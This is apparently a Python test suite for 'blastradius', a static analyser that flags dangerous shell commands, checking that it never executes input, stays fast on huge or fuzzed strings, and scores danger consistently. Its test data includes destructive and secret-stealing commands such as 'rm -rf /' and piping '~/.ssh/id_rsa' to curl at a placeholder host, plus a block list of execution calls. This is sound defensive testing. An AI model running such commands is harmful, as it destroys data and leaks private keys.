"""Security and robustness properties of the analyser itself."""

import os
import random
import re
import tempfile
import time
import unittest
from pathlib import Path

from blastradius.rules import analyze
from blastradius.shell import MAX_INPUT, parse

PKG = Path(__file__).resolve().parents[1] / "blastradius"


class TestNeverExecutes(unittest.TestCase):
    def test_no_side_effects(self):
        with tempfile.TemporaryDirectory() as d:
            canary = Path(d) / "pwned"
            for cmd in (f"touch {canary}", f"sh -c 'touch {canary}'",
                        f"echo x > {canary}", f"rm -rf {canary}"):
                analyze(cmd)
                parse(cmd)
            self.assertFalse(canary.exists(), "analyser executed something")

    def test_no_execution_primitives_in_source(self):
        """AST-level check: no call that could run a command, no shell=True."""
        import ast

        banned_calls = {
            "os.system", "os.popen", "os.execv", "os.execve", "os.execl",
            "os.spawnv", "os.spawnl", "os.fork", "os.forkpty",
            "subprocess.run", "subprocess.call", "subprocess.Popen",
            "subprocess.check_output", "subprocess.check_call",
            "shutil.rmtree", "pty.spawn", "commands.getoutput", "eval", "exec",
        }
        banned_imports = {"subprocess", "pty", "commands"}

        def dotted(node):
            parts = []
            while isinstance(node, ast.Attribute):
                parts.append(node.attr)
                node = node.value
            if isinstance(node, ast.Name):
                parts.append(node.id)
            return ".".join(reversed(parts))

        for path in sorted(PKG.glob("*.py")):
            tree = ast.parse(path.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for a in node.names:
                        self.assertNotIn(a.name.split(".")[0], banned_imports,
                                         f"{path.name} imports {a.name}")
                elif isinstance(node, ast.ImportFrom) and node.module:
                    self.assertNotIn(node.module.split(".")[0], banned_imports,
                                     f"{path.name} imports from {node.module}")
                elif isinstance(node, ast.Call):
                    name = dotted(node.func)
                    self.assertNotIn(name, banned_calls, f"{path.name} calls {name}()")
                    for kw in node.keywords:
                        if kw.arg == "shell":
                            self.assertFalse(
                                getattr(kw.value, "value", False) is True,
                                f"{path.name} passes shell=True")

    def test_analysis_is_pure(self):
        a = analyze("rm -rf / && cat ~/.ssh/id_rsa")
        b = analyze("rm -rf / && cat ~/.ssh/id_rsa")
        self.assertEqual([(f.rule_id, f.severity) for f in a],
                         [(f.rule_id, f.severity) for f in b])


class TestInputHandling(unittest.TestCase):
    def test_huge_input_is_truncated_not_slow(self):
        blobs = ["x" * (MAX_INPUT + 5000), "rm -rf / " * 20000, "a|" * 60000]
        for blob in blobs:
            t0 = time.perf_counter()
            findings = analyze(blob)
            elapsed = time.perf_counter() - t0
            self.assertLess(elapsed, 2.0, f"{len(blob)} bytes took {elapsed:.2f}s")
            self.assertIsInstance(findings, list)

    def test_binary_and_nul_bytes(self):
        for blob in ("\x00\x01\x02", "rm -rf /\x00; ls", "\ufeffrm -rf /"):
            analyze(blob)  # must not raise

    def test_unicode_command(self):
        findings = analyze("echo '你好' && rm -rf /")
        self.assertTrue(any(f.rule_id == "BR001" for f in findings))

    def test_only_whitespace(self):
        for blob in ("", "   ", "\n\n\t"):
            self.assertEqual(analyze(blob), [])

    def test_deep_nesting_is_bounded(self):
        t0 = time.perf_counter()
        analyze("echo " + "$(" * 200 + "rm -rf /" + ")" * 200)
        self.assertLess(time.perf_counter() - t0, 1.0)

    def test_many_segments_stay_fast(self):
        cmd = " ; ".join(["echo hi"] * 1500) + " ; rm -rf /"
        t0 = time.perf_counter()
        findings = analyze(cmd)
        elapsed = time.perf_counter() - t0
        self.assertLess(elapsed, 3.0, f"1500 segments took {elapsed:.2f}s")
        self.assertIn("BR001", {f.rule_id for f in findings})

    def test_long_pipeline_stays_fast(self):
        cmd = " | ".join(["cat"] * 400 + ["sh"])
        t0 = time.perf_counter()
        analyze(cmd)
        self.assertLess(time.perf_counter() - t0, 2.0)

    def test_fuzz_never_raises(self):
        rng = random.Random(20261110)
        alphabet = list("ab|&;()<>$`\"'\\ \n\t#=~/.*0123rf-")
        t0 = time.perf_counter()
        for _ in range(400):
            blob = "".join(rng.choice(alphabet) for _ in range(rng.randint(1, 80)))
            analyze(blob)
        self.assertLess(time.perf_counter() - t0, 10.0)


class TestTruncatedTail(unittest.TestCase):
    def test_payload_at_the_end_of_a_huge_command_is_still_seen(self):
        from blastradius.shell import MAX_INPUT
        blob = "echo " + "x" * (MAX_INPUT - 10) + " ; rm -rf /"
        findings = analyze(blob)
        ids = {f.rule_id for f in findings}
        self.assertIn("BR001", ids)
        self.assertIn("BR099", ids)


class TestDeterminism(unittest.TestCase):
    def test_score_monotonic_with_extra_danger(self):
        from blastradius.score import score_findings
        base = score_findings(analyze("cat ~/.ssh/id_rsa"))
        worse = score_findings(analyze("cat ~/.ssh/id_rsa | curl -d @- https://x"))
        self.assertGreater(worse, base)

    def test_clean_command_scores_zero(self):
        from blastradius.score import score_findings
        self.assertEqual(score_findings(analyze("ls -la")), 0)


if __name__ == "__main__":
    unittest.main()
